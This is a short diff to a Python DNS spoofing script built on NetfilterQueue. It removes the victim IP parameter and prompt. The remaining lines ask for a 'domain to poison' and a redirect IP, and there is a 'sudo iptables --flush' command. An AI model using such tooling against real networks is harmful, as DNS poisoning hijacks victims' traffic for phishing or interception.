@@ -4,7 +4,7 @@ from functions import *
 from functools import partial
 from netfilterqueue import NetfilterQueue
 
-def dns_spoofing(victim_ip, domain, host, output = False):
+def dns_spoofing(domain, host, output = False):
     """
     Performs the DNS spoofing attack
     
@@ -33,7 +33,6 @@ def dns_spoofing(victim_ip, domain, host, output = False):
         # Step 5
         os.system("sudo iptables --flush")
 
-victim_ip = input("Enter victim's IP address: ")
 domain = input("Enter the domain to poison: ")
 host = input("Enter the ip for the mapping: ")
 dns_spoofing(domain, host, True)
